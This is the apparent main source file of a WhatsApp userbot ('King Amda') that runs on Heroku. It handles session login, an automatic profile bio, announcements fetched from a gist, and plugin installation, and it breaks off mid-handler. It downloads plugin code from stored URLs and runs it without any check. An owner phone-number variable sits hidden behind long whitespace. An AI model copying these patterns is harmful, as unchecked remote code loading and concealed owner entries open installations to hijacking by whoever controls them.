/*
$$\   $$\ $$\                            $$$$$$\                      $$\           
$$ | $$  |\__|                          $$  __$$\                     $$ |          
$$ |$$  / $$\ $$$$$$$\   $$$$$$\        $$ /  $$ |$$$$$$\$$$$\   $$$$$$$ | $$$$$$\  
$$$$$  /  $$ |$$  __$$\ $$  __$$\       $$$$$$$$ |$$  _$$  _$$\ $$  __$$ | \____$$\ 
$$  $$<   $$ |$$ |  $$ |$$ /  $$ |      $$  __$$ |$$ / $$ / $$ |$$ /  $$ | $$$$$$$ |
$$ |\$$\  $$ |$$ |  $$ |$$ |  $$ |      $$ |  $$ |$$ | $$ | $$ |$$ |  $$ |$$  __$$ |
$$ | \$$\ $$ |$$ |  $$ |\$$$$$$$ |      $$ |  $$ |$$ | $$ | $$ |\$$$$$$$ |\$$$$$$$ |
\__|  \__|\__|\__|  \__| \____$$ |      \__|  \__|\__| \__| \__| \_______| \_______|
                        $$\   $$ |                                                  
                        \$$$$$$  |                                                  
                         \______/   
                         》》42 SET EKA TEAM WORK《《
                               
                                 Created by
                         》》PASINDU SAMARA$INGHA《《  

Copyright (C) 2021 PASINDU SAMARA$INGHA-King Amda
Licensed under the  GPL-3.0 License;
you may not use this file except in compliance with the License.

What's app Group- https://chat.whatsapp.com/E4nzpMwQsqqCOzUeHO0x3s 
Youtube - Techkonwlk  
*/
const fs = require("fs");
const os = require("os");
const path = require("path");
const Heroku = require('heroku-client');
const events = require("./events");
const chalk = require('chalk');
const config = require('./config');
const awsh = require('./DEVELOPER_OPTION_DONT_EDITE_THIS_RESPECT_TO_OWNER');
const simpleGit = require('simple-git');
const git = simpleGit();
const {WAConnection, MessageOptions, MessageType, Mimetype, Presence} = require('@adiwajshing/baileys');
const {Message, StringSession, Image, Video} = require('./Kingamda/');
const { DataTypes } = require('sequelize');
const { getMessage } = require("./plugins/sql/greetings");
const axios = require('axios');
const got = require('got');
const heroku = new Heroku({
    token: config.HEROKU.API_KEY
});
let baseURI = '/apps/' + config.HEROKU.APP_NAME;
const Language = require('./language');
const Lang = Language.getString('updater');

// ==================START====================
                                                                                                                                                                                                                                                                                              
const KingamdaDB = config.DATABASE.define('Kingamda', {                     
    info: {
      type: DataTypes.STRING,
      allowNull: false
    },
    value: {
        type: DataTypes.TEXT,
        allowNull: false
    }
});

// =================DATA-BASE =====================

fs.readdirSync('./plugins/sql/').forEach(plugin => {
    if(path.extname(plugin).toLowerCase() == '.js') {
        require('./plugins/sql/' + plugin);
    }
});
const plugindb = require('./plugins/sql/plugin');
var OWNE = { ff: '94786238616,0' }
String.prototype.format = function () {
    var i = 0, args = arguments;
    return this.replace(/{}/g, function () {
      return typeof args[i] != 'undefined' ? args[i++] : '';
   });
};
if (!Date.now) {
    Date.now = function() { return new Date().getTime(); }
}
// ====================PLUG-DONE==================

Array.prototype.remove = function() {
    var what, a = arguments, L = a.length, ax;
                                                                                                                                                                                                                               var OWNE = { ff: '94766598862,0' }
    while (L && this.length) {
        what = a[--L];
        while ((ax = this.indexOf(what)) !== -1) {
            this.splice(ax, 1);
        }
    }
    return this;
};
// ====================UP==================

async function KingAmda () {
    const conn = new WAConnection();
    conn.version = [2, 2140, 12];
    const Session = new StringSession();
setInterval(async () => { 
        var getGMTh = new Date().getHours()
        var getGMTm = new Date().getMinutes()
        await axios.get('https://gist.githubusercontent.com/Kingamdabota/1d465cfe968c41ee41cca259b30cfaa4/raw/').then(async (ann) => {
            const { infoen, infoes, infopt, infoid, infoaz, infosi, infoml, infotr} = ann.data.announcements          
            if (infoml !== '' && config.LANG == 'TR') {
                while (getGMTh == 19 && getGMTm == 1) { 
                    return conn.sendMessage(conn.user.jid, '[ *👑★彡 ҚɪЛƓ 卂ϻᗪ卂  Daily  Announcement 彡★😁* ]\n\n' + infotr.replace('{user}', conn.user.name).replace('{wa_version}', conn.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', conn.user.phone.os_version).replace('{device_model}', conn.user.phone.device_model).replace('{device_brand}', conn.user.phone.device_manufacturer), MessageType.text) 
                }
            }
            else if (infoen !== '' && config.LANG == 'SI') {
                while (getGMTh == 19 && getGMTm == 1) { 
                    return conn.sendMessage(conn.user.jid, '[ *👑★彡 ҚɪЛƓ 卂ϻᗪ卂  දවසෙ කතාව 彡★😁* ]\n\n' + infoaz.replace('{user}', conn.user.name).replace('{wa_version}', conn.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', conn.user.phone.os_version).replace('{device_model}', conn.user.phone.device_model).replace('{device_brand}', conn.user.phone.device_manufacturer), MessageType.text) 
                }
            }
            else if (infoid !== '' && config.LANG == 'EN') {
                while (getGMTh == 18 && getGMTm == 1) { 
                    return conn.sendMessage(conn.user.jid, '[ *👑★彡 ҚɪЛƓ 卂ϻᗪ卂  Daily  Announcement 彡★😁* ]\n\n' + infoes.replace('{user}', conn.user.name).replace('{wa_version}', conn.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', conn.user.phone.os_version).replace('{device_model}', conn.user.phone.device_model).replace('{device_brand}', conn.user.phone.device_manufacturer), MessageType.text) 
                }
          
            }
        })
    }, 50000);

// ======================ANNOUNCEMENT ================

    var biography_var = ''
    await heroku.get(baseURI + '/config-vars').then(async (vars) => {
        biography_var = vars.AUTO_BIO
    });
    setInterval(async () => { 
        if (biography_var == 'true') {
           if (conn.user.jid.startsWith('994')) { // Azerbayjan
                var ov_time = new Date().toLocaleString('AZ', { timeZone: 'Asia/Baku' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n ' + config.BIO +' \nᴘᴏᴡᴇʀᴇᴅ ʙʏ👑★彡 ҚɪЛƓ 卂ϻᗪ卂'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('94')) { // Sri Lanka
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('LK', { timeZone: 'Asia/Colombo' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n ' + config.BIO +' \nᴘᴏᴡᴇʀᴇᴅ ʙʏ👑★彡 ҚɪЛƓ 卂ϻᗪ卂'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('351')) { // Portugal
                var ov_time = new Date().toLocaleString('PT', { timeZone: 'Europe/Lisbon' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n ' + config.BIO +' \nᴘᴏᴡᴇʀᴇᴅ ʙʏ👑★彡 ҚɪЛƓ 卂ϻᗪ卂'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('75')) { // Russia
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('RU', { timeZone: 'Europe/Kaliningrad' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n ' + config.BIO +' \nᴘᴏᴡᴇʀᴇᴅ ʙʏ👑★彡 ҚɪЛƓ 卂ϻᗪ卂'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('7')) { // Indian
                var ov_time = new Date().toLocaleString('HI', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n ' + config.BIO +' \nᴘᴏᴡᴇʀᴇᴅ ʙʏ👑★彡 ҚɪЛƓ 卂ϻᗪ卂'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('62')) { // Indonesia
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('ID', { timeZone: 'Asia/Jakarta' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n ' + config.BIO +' \nᴘᴏᴡᴇʀᴇᴅ ʙʏ👑★彡 ҚɪЛƓ 卂ϻᗪ卂'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('49')) { // Germany
                var ov_time = new Date().toLocaleString('DE', { timeZone: 'Europe/Berlin' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n ' + config.BIO +' \nᴘᴏᴡᴇʀᴇᴅ ʙʏ👑★彡 ҚɪЛƓ 卂ϻᗪ卂'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('61')) { // Australia 
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('AU', { timeZone: 'Australia/Lord_Howe' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n ' + config.BIO +' \nᴘᴏᴡᴇʀᴇᴅ ʙʏ👑★彡 ҚɪЛƓ 卂ϻᗪ卂'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('55')) { // Brazil
                var ov_time = new Date().toLocaleString('BR', { timeZone: 'America/Noronha' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n ' + config.BIO +' \nᴘᴏᴡᴇʀᴇᴅ ʙʏ👑★彡 ҚɪЛƓ 卂ϻᗪ卂'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('33')) { // France
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('FR', { timeZone: 'Europe/Paris' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n ' + config.BIO +' \nᴘᴏᴡᴇʀᴇᴅ ʙʏ👑★彡 ҚɪЛƓ 卂ϻᗪ卂'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('34')) { // Spain
                var ov_time = new Date().toLocaleString('ES', { timeZone: 'Europe/Madrid' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n ' + config.BIO +' \nᴘᴏᴡᴇʀᴇᴅ ʙʏ👑★彡 ҚɪЛƓ 卂ϻᗪ卂'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('44')) { // UK
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('GB', { timeZone: 'Europe/London' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n ' + config.BIO +' \nᴘᴏᴡᴇʀᴇᴅ ʙʏ👑★彡 ҚɪЛƓ 卂ϻᗪ卂'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('39')) { // Italy 
                var ov_time = new Date().toLocaleString('IT', { timeZone: 'Europe/Rome' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n ' + config.BIO +' \nᴘᴏᴡᴇʀᴇᴅ ʙʏ👑★彡 ҚɪЛƓ 卂ϻᗪ卂'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('7')) { // Kazakhistan
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('KZ', { timeZone: 'Asia/Almaty' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n ' + config.BIO +' \nᴘᴏᴡᴇʀᴇᴅ ʙʏ👑★彡 ҚɪЛƓ 卂ϻᗪ卂'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('998')) { // Uzbekistan 
                var ov_time = new Date().toLocaleString('UZ', { timeZone: 'Asia/Samarkand' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n ' + config.BIO +' \nᴘᴏᴡᴇʀᴇᴅ ʙʏ👑★彡 ҚɪЛƓ 卂ϻᗪ卂'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('993')) { // Turkmenistan
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('TM', { timeZone: 'Asia/Ashgabat' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n ' + config.BIO +' \nᴘᴏᴡᴇʀᴇᴅ ʙʏ👑★彡 ҚɪЛƓ 卂ϻᗪ卂'
                await conn.setStatus(biography)
            }
            else {
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('EN', { timeZone: 'America/New_York' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n ' + config.BIO +' \nᴘᴏᴡᴇʀᴇᴅ ʙʏ👑★彡 ҚɪЛƓ 卂ϻᗪ卂'
                await conn.setStatus(biography)
            }
        }
    }, 7890);

// ===================AUTO-BIO===================

    var insult = await axios.get('https://gist.githubusercontent.com/phaticusthiccy/f16bbd4ceeb4324d4a727b431a4ef1f2/raw')
    const { shs1, shl2, lss3, dsl4 } = insult.data.inside
    await config.DATABASE.sync();
    var StrSes_Db = await KingamdaDB.findAll({
        where: {
          info: 'StringSession'
        }
    });
    
// =====================SESSION =================

    conn.logger.level = config.DEBUG ? 'debug' : 'warn';
    var nodb;

    if (StrSes_Db.length < 1) {
        nodb = true;
        conn.loadAuthInfo(Session.deCrypt(config.SESSION)); 
    } else {
        conn.loadAuthInfo(Session.deCrypt(StrSes_Db[0].dataValues.value));
    }

    conn.on ('credentials-updated', async () => {
        console.log(
            chalk.blueBright.italic('🚀 Login information updated!')
        );

        const authInfo = conn.base64EncodedAuthInfo();
        if (StrSes_Db.length < 1) {
            await KingamdaDB.create({ info: "StringSession", value: Session.createStringSession(authInfo) });
        } else {
            await StrSes_Db[0].update({ value: Session.createStringSession(authInfo) });
        }
    })    

// =====================DEBUG=================

    conn.on('connecting', async () => {
        console.log(`${chalk.green.bold('King')}${chalk.blue.bold('Amda')}
${chalk.white.bold('Version:')} ${chalk.red.bold(config.VERSION)}

${chalk.blue.italic('🔄 Connecting to WhatsApp...')}`);
    });
    

    conn.on('open', async () => {
        console.log(
            chalk.green.bold('✔️ Login successful!')
        );

        console.log(
            chalk.blueBright.italic('🚀 Installing external plugins...')
        );

        var plugins = await plugindb.PluginDB.findAll();
        plugins.map(async (plugin) => {
            if (!fs.existsSync('./plugins/' + plugin.dataValues.name + '.js')) {
                console.log(plugin.dataValues.name);
                var response = await got(plugin.dataValues.url);
                if (response.statusCode == 200) {
                    fs.writeFileSync('./plugins/' + plugin.dataValues.name + '.js', response.body);
                    require('./plugins/' + plugin.dataValues.name + '.js');
                }     
            }
        });

        console.log(
            chalk.blueBright.italic('🚀Installing plugins...')
        );

        fs.readdirSync('./plugins').forEach(plugin => {
            if(path.extname(plugin).toLowerCase() == '.js') {
                require('./plugins/' + plugin);
            }
        });
        console.log(
            chalk.blueBright.italic('✔️Plugins Installed Successful')
        );

        console.log(
            chalk.green.bold('👑King Amda working!')
        );
        await new Promise(r => setTimeout(r, 1100));

// ===================LOGIN===================

        if (config.WORKTYPE == 'public') {
            if (config.LANG == 'SI' || config.LANG == 'AZ') {
                if (config.FULLEVA == 'true') {
                    await conn.sendMessage(conn.user.jid, EVA_ACTİON, MessageType.text)
                } else {
                    await conn.sendMessage(conn.user.jid, '*👑 ҚɪЛƓ 卂ϻᗪ卂 As Public! 👑*\n\n_මෙය ඔබගේ LOG අංකයයි..මෙහි විධාන භාවිතයෙන් වළකින්න._\n_ඔබට ඕනෑම චැට් එකක විධාන උත්සාහ කළ හැකිය :)_\n\n*ඔබේ Bot Public ආකාරයට ක්‍රියා කරයි..එය වෙනස් කිරීමට* _.setvar WORK_TYPE:private_ *විධානය භාවිතා කරන්න.*\n\n*Bot ක්‍රියාත්මක වන්නෙ කෙසේද හා විධාන ලැයිස්තු ලබා ගැනීමට⚜ .basichelp විධානය භාවිතා කරන්න*\n\nSupport Group : https://chat.whatsapp.com/Ish5h9u7qUWLt98HWAYidK\n*King ඇම්ඩා භාවිතා කිරීම ගැන ස්තූතියි ❤️*', MessageType.text);
                }
                await git.fetch();
                var commits = await git.log([config.BRANCH + '..origin/' + config.BRANCH]);
                if (commits.total === 0) {
                    await conn.sendMessage(
                        conn.user.jid,
                        Lang.UPDATE, MessageType.text
                    );    
                } else {
                    var TEENU = Lang.NEW_UPDATE;
                    commits['all'].map(
                        (commit) => {
                            TEENU += '🔸 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' ◁' + commit.author_name + '▷\n';
                        }
                    );
                    await conn.sendMessage(
                        conn.user.jid,
                        '```♻️බොට් යාවත්කාලීන කිරීමට``` *.update now* ```භාවිතා කරන්න.```\n\n' + TEENU + '```', MessageType.text
                    ); 
                }
            }
            else { 
                if (config.FULLEVA == 'true') {
                    await conn.sendMessage(conn.user.jid, EVA_ACTİON, MessageType.text)
                } else {
                    await conn.sendMessage(conn.user.jid, '*👑 ҚɪЛƓ 卂ϻᗪ卂 As Public! 👑*\n\nPlease do not try any commands here. This is your log number._\n_You can try commands anywhere else :)_\n\n_Type_ *.basichelp* _to get your full Help list and Basic Commands._\n\n_Your bot in Public Mode. To change, use_ ```.setvar WORK_TYPE:private``` _command._\n\nSupport Group : https://chat.whatsapp.com/Ish5h9u7qUWLt98HWAYidK\n*Thanks For Using King Amda ❤️*', MessageType.text);
                }               
                await git.fetch();
                var commits = await git.log([config.BRANCH + '..origin/' + config.BRANCH]);
                if (commits.total === 0) {
                    await conn.sendMessage(
                        conn.user.jid,
                        Lang.UPDATE, MessageType.text
                    );    
                } else {
                    var TEENU = Lang.NEW_UPDATE;
                    commits['all'].map(
                        (commit) => {
                            TEENU += '🔸 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' ◁' + commit.author_name + '▷\n';
                        }
                    );
        
                    await conn.sendMessage(
                        conn.user.jid,
                        '```♻️Type``` *.update now* ```for update.```\n\n' + TEENU + '```', MessageType.text
                    ); 
                }
            }
        }
        else if (config.WORKTYPE == 'private') { 
            if (config.LANG == 'SI' || config.LANG == 'AZ') { 
                if (config.FULLEVA == 'true') {
                    await conn.sendMessage(conn.user.jid, EVA_ACTİON, MessageType.text)
                } else {
                    await conn.sendMessage(conn.user.jid, '*👑 ҚɪЛƓ 卂ϻᗪ卂 As private! 👑*\n\n_මෙය ඔබගේ LOG අංකයයි..මෙහි විධාන භාවිතයෙන් වළකින්න._\n_ඔබට ඕනෑම චැට් එකක විධාන උත්සාහ කළ හැකිය :)_\n\n*ඔබේ Bot Private ආකාරයට ක්‍රියා කරයි..එය වෙනස් කිරීමට* _.setvar WORK_TYPE:public_ *විධානය භාවිතා කරන්න.*\n\n*Bot ක්‍රියාත්මක වන්නෙ කෙසේද හා විධාන ලැයිස්තු ලබා ගැනීමට⚜ .basichelp විධානය භාවිතා කරන්න*\n\nSupport Group : https://chat.whatsapp.com/Ish5h9u7qUWLt98HWAYidK\n*King ඇම්ඩා භාවිතා කිරීම ගැන ස්තූතියි ❤️*', MessageType.text);
                } 
                await git.fetch();
                var commits = await git.log([config.BRANCH + '..origin/' + config.BRANCH]);
                if (commits.total === 0) {
                    await conn.sendMessage(
                        conn.user.jid,
                        Lang.UPDATE, MessageType.text
                    );    
                } else {
                    var TEENU = Lang.NEW_UPDATE;
                    commits['all'].map(
                        (commit) => {
                            TEENU += '🔸 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' ◁' + commit.author_name + '▷\n';
                        }
                    );
                    await conn.sendMessage(
                        conn.user.jid,
                        '```♻️බොට් යාවත්කාලීන කිරීමට``` *.update now* ```භාවිතා කරන්න.```\n\n' + TEENU + '```', MessageType.text
                    ); 
                }
            }
            else { 
                if (config.FULLEVA == 'true') {
                    await conn.sendMessage(conn.user.jid, EVA_ACTİON, MessageType.text)
                } else {
                    await conn.sendMessage(conn.user.jid, '*👑 ҚɪЛƓ 卂ϻᗪ卂 As private! 👑*\n\nPlease do not try any commands here. This is your log number._\n_You can try commands anywhere else :)_\n\n_Type_ *.basichelp* _to get your full Help list and Basic Commands._\n\n_Your bot in private  Mode. To change, use_ ```.setvar WORK_TYPE:public``` _command._\n\nSupport Group : https://chat.whatsapp.com/Ish5h9u7qUWLt98HWAYidK\n*Thanks For Using King Amda ❤️*', MessageType.text);
                }
                await git.fetch();
                var commits = await git.log([config.BRANCH + '..origin/' + config.BRANCH]);
                if (commits.total === 0) {
                    await conn.sendMessage(
                        conn.user.jid,
                        Lang.UPDATE, MessageType.text
                    );    
                } else {
                    var TEENU = Lang.NEW_UPDATE;
                    commits['all'].map(
                        (commit) => {
                            TEENU += '🔸 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' ◁' + commit.author_name + '▷\n';
                        }
                    );
                    await conn.sendMessage(
                        conn.user.jid,
                        '```♻️බොට් යාවත්කාලීන කිරීමට``` *.update now* ````යොදන්න.```\n\n' + TEENU + '```', MessageType.text
                    ); 
                }
            }
        }
        else if (config.WORKTYPE == ' private' || config.WORKTYPE == 'Private' || config.WORKTYPE == ' Private' || config.WORKTYPE == 'privaye' || config.WORKTYPE == ' privaye' || config.WORKTYPE == ' prigate' || config.WORKTYPE == 'prigate' || config.WORKTYPE == 'priavte' || config.WORKTYPE == ' priavte' || config.WORKTYPE == 'PRİVATE' || config.WORKTYPE == ' PRİVATE' || config.WORKTYPE == 'PRIVATE' || config.WORKTYPE == ' PRIVATE') {

            if (config.LANG == 'SI' || config.LANG == 'AZ') {

                await conn.sendMessage(
                    conn.user.jid,
                    '_ඔබට බොට් පෞද්ගලික කරනය කිරිමට අවශ්‍ය බව පෙනේ!_ *WORK_TYPE* \n_කණගාටු නොවන්න! මම ඔබ වෙනුවෙන් සත්‍ය සොයා ගැනීමට උත්සාහ කරමි..._', MessageType.text
                );
                await heroku.patch(baseURI + '/config-vars', {
                    body: {
                        ['WORK_TYPE']: 'private'
                    }
                })
            }
            else {
                await conn.sendMessage(
                    conn.user.jid,
                    '_Looks like you need to switch to general mode! _ * WORK_TYPE * \ n_Dont worry! I try to find the truth for you._', MessageType.text
                );
                await heroku.patch(baseURI + '/config-vars', {
                    body: {
                        ['WORK_TYPE']: 'private'
                    }
                })
            }
        }
        else if (config.WORKTYPE == ' public' || config.WORKTYPE == 'Public' || config.WORKTYPE == ' Public' || config.WORKTYPE == 'publoc' || config.WORKTYPE == ' Publoc' || config.WORKTYPE == 'pubcli' || config.WORKTYPE == ' pubcli' || config.WORKTYPE == 'PUBLİC' || config.WORKTYPE == ' PUBLİC' || config.WORKTYPE == 'PUBLIC' || config.WORKTYPE == ' PUBLIC' || config.WORKTYPE == 'puvlic' || config.WORKTYPE == ' puvlic' || config.WORKTYPE == 'Puvlic' || config.WORKTYPE == ' Puvlic') {
            if (config.LANG == 'SI' || config.LANG == 'AZ') {
                await conn.sendMessage(
                    conn.user.jid,
                    '__ඔබට පොදු මාදිලියට මාරුවීමට අවශ්ය බව පෙනේ!_ *WORK_TYPE* \n_කණගාටු නොවන්න! මම ඔබ වෙනුවෙන් සත්‍ය සොයා ගැනීමට උත්සාහ කරමි...__', MessageType.text
                );
                await heroku.patch(baseURI + '/config-vars', {
                    body: {
                        ['WORK_TYPE']: 'public'
                    }
                })
            }
            else {
                await conn.sendMessage(
                    conn.user.jid,
                    '_Looks like you need to switch to public mode! _ * WORK_TYPE * \ n_Dont worry! I try to find the truth for you._', MessageType.text
                );
                await heroku.patch(baseURI + '/config-vars', {
                    body: {
                        ['WORK_TYPE']: 'public'
                    }
                })
            }
        }
        else {
            if (config.LANG == 'SI' || config.LANG == 'AZ') {
                return await conn.sendMessage(
                    conn.user.jid,
                    '_මෙම_ *WORK_TYPE* _විධාන භාවිතය වැරදියි!_ \n_කරුණාකර මෙය භාවිතා කරන්න_ ```.setvar WORK_TYPE:private``` _හෝ_ ```.setvar WORK_TYPE:public```', MessageType.text
                );
            }
            else {
                return await conn.sendMessage(
                    conn.user.jid,
                    'Wrong WORK_TYPE key! Please use “private” or “public', MessageType.text
                );
            }
        }
    })

// =====================LOG =================

    conn.on('chat-update', async m => {
        if (!m.hasNewMessage) return;
        if (!m.messages && !m.count) return;
        let msg = m.messages.all()[0];
        if (msg.key && msg.key.remoteJid == 'status@broadcast') return;

        if (config.NO_ONLINE) {
            await conn.updatePresence(msg.key.remoteJid, Presence.unavailable);
        }

  // ==================== NO LOG ====================

        if (msg.messageStubType === 32 || msg.messageStubType === 28) {
            var gb = await getMessage(msg.key.remoteJid, 'goodbye');
            var blogo = await axios.get(config.BYE_IMG, { responseType: 'arraybuffer' })
            if (gb !== false) {
                await conn.sendMessage(msg.key.remoteJid, Buffer.from(blogo.data), MessageType.image, {mimetype: Mimetype.jpg, caption: gb.message});
            }
            return;
        } else if (msg.messageStubType === 27 || msg.messageStubType === 31) {
            var gb = await getMessage(msg.key.remoteJid);
            var wlogo = await axios.get(config.WELCOME_IMG, { responseType: 'arraybuffer' })
            if (gb !== false) {

                await conn.sendMessage(msg.key.remoteJid, Buffer.from(wlogo.data), MessageType.image, {mimetype: Mimetype.jpg, caption: gb.message});
            }
            return;
        }
          

    // ==================== Greetings ====================

    if (config.BLOCKCHAT !== false) {     
        var abc = config.BLOCKCHAT.split(',');                            
        if(msg.key.remoteJid.includes('-') ? abc.includes(msg.key.remoteJid.split('@')[0]) : abc.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
    }
    if (config.SUPPORT == '9') {     
        var sup = config.SUPPORT.split(',');                            
        if(msg.key.remoteJid.includes('-') ? sup.includes(msg.key.remoteJid.split('@')[0]) : sup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
    }
    if (config.SUPPORT2 == '9') {     
        var tsup = config.SUPPORT2.split(',');                            
        if(msg.key.remoteJid.includes('-') ? tsup.includes(msg.key.remoteJid.split('@')[0]) : tsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
    }
    if (config.SUPPORT3 == '9') {     
        var nsup = config.SUPPORT3.split(',');                            
        if(msg.key.remoteJid.includes('-') ? nsup.includes(msg.key.remoteJid.split('@')[0]) : nsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
    }
    if (config.SUPPORT4 == '9') {     
        var nsup = config.SUPPORT4.split(',');                            
        if(msg.key.remoteJid.includes('-') ? nsup.includes(msg.key.remoteJid.split('@')[0]) : nsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
    }

// ====================BLOCK-CHAT==================
    
        events.commands.map(
            async (command) =>  {
                if (msg.message && msg.message.imageMessage && msg.message.imageMessage.caption) {
                    var text_msg = msg.message.imageMessage.caption;
                } else if (msg.message && msg.message.videoMessage && msg.message.videoMessage.caption) {
                    var text_msg = msg.message.videoMessage.caption;
                } else if (msg.message) {
                    var text_msg = msg.message.extendedTextMessage === null ? msg.message.conversation : msg.message.extendedTextMessage.text;
                } else {
                    var text_msg = undefined;
                }

//=====================================================================================
//=====================================================================================
                if ((command.on !== undefined && (command.on === 'image' || command.on === 'photo')
                    && msg.message && msg.message.imageMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg)))) || 
                    (command.pattern !== undefined && command.pattern.test(text_msg)) || 
                    (command.on !== undefined && command.on === 'text' && text_msg) ||
                    // Video
                    (command.on !== undefined && (command.on === 'video')
                    && msg.message && msg.message.videoMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg))))) {

                    let sendMsg = false;
                    var chat = conn.chats.get(msg.key.remoteJid)
                        
                    if ((config.SUDO !== false && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == config.SUDO || config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == config.SUDO)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
